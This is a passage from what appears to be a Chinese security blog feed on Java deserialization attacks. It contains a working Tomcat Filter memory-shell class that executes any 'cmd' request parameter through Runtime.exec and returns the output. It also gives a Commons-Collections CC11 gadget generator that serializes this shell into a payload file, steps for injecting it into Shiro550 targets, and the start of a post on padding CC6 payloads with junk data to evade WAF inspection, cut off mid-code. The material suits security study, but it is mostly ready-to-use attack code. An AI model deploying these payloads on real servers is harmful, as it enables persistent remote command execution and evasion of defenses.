 * webshell命令参数名  </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span> <span class="string">&quot;cmd&quot;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterUrlPattern</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;Drunkbaby&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> getServletContext();  </span><br><span class="line">            <span class="keyword">if</span> (servletContext != <span class="literal">null</span>)&#123;  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">ctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                ctx.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) ctx.get(servletContext);  </span><br><span class="line">  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                stdctx.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(appctx);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (standardContext != <span class="literal">null</span>)&#123;  </span><br><span class="line">                    <span class="comment">// 这样设置不会抛出报错  </span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> org.apache.catalina.util.LifecycleBase.class  </span><br><span class="line">                            .getDeclaredField(<span class="string">&quot;state&quot;</span>);  </span><br><span class="line">                    stateField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                    stateField.set(standardContext, LifecycleState.STARTING_PREP);  </span><br><span class="line">  </span><br><span class="line">                    <span class="type">Filter</span> <span class="variable">myFilter</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TomcatInject</span>();  </span><br><span class="line">                    <span class="comment">// 调用 doFilter 来动态添加我们的 Filter                    // 这里也可以利用反射来添加我们的 Filter                    </span></span><br><span class="line">                    javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> servletContext.addFilter(filterName,myFilter);  </span><br><span class="line">  </span><br><span class="line">                    <span class="comment">// 进行一些简单的设置  </span></span><br><span class="line">                    filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);  </span><br><span class="line">                    filterRegistration.setAsyncSupported(<span class="literal">false</span>);  </span><br><span class="line">                    <span class="comment">// 设置基本的 url pattern                    filterRegistration  </span></span><br><span class="line">                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,  </span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">                    <span class="comment">// 将服务重新修改回来，不然的话服务会无法正常进行  </span></span><br><span class="line">                    <span class="keyword">if</span> (stateField != <span class="literal">null</span>)&#123;  </span><br><span class="line">                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);  </span><br><span class="line">                    &#125;  </span><br><span class="line">  </span><br><span class="line">                    <span class="comment">// 在设置之后我们需要 调用 filterstart                    </span></span><br><span class="line">                    <span class="keyword">if</span> (standardContext != <span class="literal">null</span>)&#123;  </span><br><span class="line">                        <span class="comment">// 设置filter之后调用 filterstart 来启动我们的 filter                        Method filterStartMethod = StandardContext.class.getDeclaredMethod(&quot;filterStart&quot;);  </span></span><br><span class="line">                        filterStartMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                        filterStartMethod.invoke(standardContext,<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">                        <span class="comment">/**  </span></span><br><span class="line"><span class="comment">                         * 将我们的 filtermap 插入到最前面  </span></span><br><span class="line"><span class="comment">                         */</span>  </span><br><span class="line">  </span><br><span class="line">                        <span class="type">Class</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">                        <span class="keyword">try</span> &#123;  </span><br><span class="line">                            ccc = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);  </span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;  </span><br><span class="line">                        <span class="keyword">if</span> (ccc == <span class="literal">null</span>) &#123;  </span><br><span class="line">                            <span class="keyword">try</span> &#123;  </span><br><span class="line">                                ccc = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);  </span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;  </span><br><span class="line">                        &#125;  </span><br><span class="line">                        <span class="comment">//把filter插到第一位  </span></span><br><span class="line">                        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>)  </span><br><span class="line">                                .getDeclaredMethod(<span class="string">&quot;findFilterMaps&quot;</span>);  </span><br><span class="line">                        Object[] filterMaps = (Object[]) m.invoke(standardContext);  </span><br><span class="line">                        Object[] tmpFilterMaps = <span class="keyword">new</span> <span class="title class_">Object</span>[filterMaps.length];  </span><br><span class="line">                        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">1</span>;  </span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;  </span><br><span class="line">                            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> filterMaps[i];  </span><br><span class="line">                            m = ccc.getMethod(<span class="string">&quot;getFilterName&quot;</span>);  </span><br><span class="line">                            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) m.invoke(o);  </span><br><span class="line">                            <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;  </span><br><span class="line">                                tmpFilterMaps[<span class="number">0</span>] = o;  </span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                                tmpFilterMaps[index++] = filterMaps[i];  </span><br><span class="line">                            &#125;  </span><br><span class="line">                        &#125;  </span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;  </span><br><span class="line">                            filterMaps[i] = tmpFilterMaps[i];  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ServletContext <span class="title function_">getServletContext</span><span class="params">()</span>  </span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="comment">/*shell注入，前提需要能拿到request、response等*/</span>  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) f.get(<span class="literal">null</span>);  </span><br><span class="line">        <span class="comment">//不为空则意味着第一次反序列化的准备工作已成功  </span></span><br><span class="line">        <span class="keyword">if</span> (threadLocal != <span class="literal">null</span> &amp;&amp; threadLocal.get() != <span class="literal">null</span>) &#123;  </span><br><span class="line">            servletRequest = (ServletRequest) threadLocal.get();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">//如果不能去到request，则换一种方式尝试获取  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//spring获取法1  </span></span><br><span class="line">        <span class="keyword">if</span> (servletRequest == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                c = Class.forName(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);  </span><br><span class="line">                <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);  </span><br><span class="line">                c = Class.forName(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);  </span><br><span class="line">                m = c.getMethod(<span class="string">&quot;getRequest&quot;</span>);  </span><br><span class="line">                servletRequest = (ServletRequest) m.invoke(o);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;&#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (servletRequest != <span class="literal">null</span>)  </span><br><span class="line">            <span class="keyword">return</span> servletRequest.getServletContext();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//spring获取法2  </span></span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            c = Class.forName(<span class="string">&quot;org.springframework.web.context.ContextLoader&quot;</span>);  </span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getCurrentWebApplicationContext&quot;</span>);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);  </span><br><span class="line">            c = Class.forName(<span class="string">&quot;org.springframework.web.context.WebApplicationContext&quot;</span>);  </span><br><span class="line">            m = c.getMethod(<span class="string">&quot;getServletContext&quot;</span>);  </span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> (ServletContext) m.invoke(o);  </span><br><span class="line">            <span class="keyword">return</span> servletContext;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;&#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span>  </span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,  </span></span><br><span class="line"><span class="params">                         FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        System.out.println(  </span><br><span class="line">                <span class="string">&quot;TomcatShellInject doFilter.....................................................................&quot;</span>);  </span><br><span class="line">        String cmd;  </span><br><span class="line">        <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);  </span><br><span class="line">            java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));  </span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">            String line;  </span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());  </span><br><span class="line">            servletResponse.getOutputStream().flush();  </span><br><span class="line">            servletResponse.getOutputStream().close();  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="g5aWN">序列化数据生成</h4>

<p>这里使用CC11的链子，这里我们只能使用动态加载字节码的方式来进行注入</p>
<p>我们使用CC11链子，分别生成<strong>半通用回显</strong>和<strong>内存马注入</strong>的两个存储着序列化数据的文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.EXP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Template</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用反射调用 templates 中的 newTransformer 方法</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="comment">// 我们要设置 HashSet 的 map 为我们的 HashMap</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在 invoke 之后，</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc11Step1.ser&quot;));</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc11Step2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//    第一次</span></span><br><span class="line"><span class="comment">//                InputStream inputStream = new FileInputStream(new File(&quot;F:\\java\\serMem\\target\\classes\\com\\EXP\\TomcatEcho.class&quot;));</span></span><br><span class="line"><span class="comment">//          第二次</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;F:\\java\\serMem\\target\\classes\\com\\EXP\\TomcatInject.class&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        InputStream inputStream = new FileInputStream(new File(&quot;F:\\java\\serMem\\target\\classes\\com\\EXP\\Calc.class&quot;));</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">filter</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="jqO4z">反序列化注入</h4>

<p>两者接注入即可，首先注入<strong>Tomcat半通用回显</strong>，其次注入<strong>Filter内存马</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744204929727-a04b60b9-f27a-4b42-ae62-30392c64dbab.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744204929727-a04b60b9-f27a-4b42-ae62-30392c64dbab.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744205094154-6969b0bb-5a0a-4e05-a028-8f25a399c46c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744205094154-6969b0bb-5a0a-4e05-a028-8f25a399c46c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744205119881-b2dbee6e-ee58-4d67-8ffb-4096903ad30f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744205119881-b2dbee6e-ee58-4d67-8ffb-4096903ad30f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<ul>
<li>这一种反序列化注入内存马的方式，并且像shiro这种自带Filter的是无法打通的，如果使用shiro550打内存马，需要获取全局 response，并且根据Tomcat版本高低来打</li>
</ul>
<h3 id="x7wLl">内存马打Shiro550</h3>

<p>通过全局存储 Response 回显来打</p>
<p>直接用KpLi0rn师傅的这个项目来打shiro内存马<a href="https://github.com/KpLi0rn/ShiroVulnEnv">https://github.com/KpLi0rn/ShiroVulnEnv</a></p>
<p>首先通过注入<code>tomcatHeader.ser</code>来绕过长度限制</p>
<p>最后用<code>tomcatInject.ser</code>注入回显内存马</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744215235220-202b7403-11d0-4f23-a024-751bcc6143ec.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744215235220-202b7403-11d0-4f23-a024-751bcc6143ec.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>memShell</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化绕WAF之加大量脏数据</title>
    <url>/2025/04/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95WAF%E4%B9%8B%E5%8A%A0%E5%A4%A7%E9%87%8F%E8%84%8F%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="Ja2aV">Java反序列化绕WAF之加大量脏数据</h1>
<h2 id="n7vIF">WAF背景</h2>
大多数的WAF受限于性能影响，当request足够大时，WAF就可能因为性能原因而做出让步，超出检查长度的内容，将不会被检查。这一点在一些CTF的题目中有所体现。

<p>虽然这样可以绕过检测，但是我们的序列化数据是二进制数据，直接加入垃圾数据破坏了序列化的结构，在readObject反序列化的时候并没有反序列化成功。</p>
<h2 id="cU3wF">脏数据添加</h2>
这里存在的思路是，找到一个可以序列化的类，可以将我们的脏数据和ysoserial gadget对象一起包裹起来。

<p><strong>条件：</strong></p>
<ul>
<li>实现Serializable接口</li>
<li>可以存储任意对象</li>
</ul>
<p>这么一看，集合类型就非常符合需求了。</p>
<ol>
<li>ArrayList</li>
<li>LinkedList</li>
<li>HashMap</li>
<li>LinkedHashMap</li>
<li>TreeMap</li>
<li>……</li>
</ol>
<h2 id="IOivI">实现</h2>
这里拿CC6的链子举例，我们需要构造一个dirtyData和一个集合类，将我们的dirtyData和入口类用该集合类包裹起来，进行序列化即可。

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.review.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dirty</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span 